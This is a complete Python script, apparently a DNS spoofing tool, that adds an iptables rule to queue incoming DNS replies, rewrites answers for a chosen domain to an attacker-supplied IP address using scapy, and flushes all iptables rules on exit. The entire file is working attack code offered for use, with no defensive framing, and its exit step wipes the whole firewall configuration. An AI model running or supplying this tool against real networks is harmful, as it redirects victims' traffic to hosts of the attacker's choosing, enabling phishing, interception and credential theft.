from scapy.all import *
from netfilterqueue import NetfilterQueue
import argparse
import sys
import os


def dnsSpoof(packet):
    originalPayload = IP(packet.get_payload())

    if not originalPayload.haslayer(DNSQR):
        packet.accept()

    if not fqdnToSpoof in originalPayload[DNS].qd.qname:
        packet.accept()
    else:

        print("Intercepted DNS request for {}: {}".format(
            fqdnToSpoof, originalPayload.summary()))

        spoofedPayload = IP(dst=originalPayload[IP].dst, src=originalPayload[IP].src) /\
            UDP(dport=originalPayload[UDP].dport, sport=originalPayload[UDP].sport) /\
            DNS(id=originalPayload[DNS].id, qr=1, aa=1, qd=originalPayload[DNS].qd,
                an=DNSRR(rrname=originalPayload[DNS].qd.qname, ttl=10, rdata=spoofToIP))

        print("Spoofing DNS response to: {}".format(spoofedPayload.summary()))
        packet.set_payload(bytes(spoofedPayload))
        packet.accept()
        print("------------------------------------------")



parser = argparse.ArgumentParser()
parser.add_argument('-q', required=True,
                    metavar='Netfilter Queue ID for binding')
parser.add_argument('-s', required=True,
                    metavar='fqdn to spoof/ip_address')
args = parser.parse_args()

(fqdnToSpoof, spoofToIP) = args.s.split('/')
fqdnToSpoof = str.encode(fqdnToSpoof)
queueId = int(args.q)


nfqueue = NetfilterQueue()
nfqueue.bind(queueId, dnsSpoof)

try:
    print("Writting iptables...")
    cmd =f"iptables -A INPUT -p udp  --sport 53 -j NFQUEUE --queue-num {args.q}"
    print(cmd)
    os.system(cmd)
    print("Intercepting nfqueue: {}".format(str(queueId)))
    print("Spoofing {} to {}".format(str(fqdnToSpoof), spoofToIP))
    print("------------------------------------------")
    nfqueue.run()
except KeyboardInterrupt:
    #pass
    print("Restoring iptables...") 
    cmd = "iptables --flush"
    print(cmd) 
    os.system(cmd)
    print("------------------------------------------")
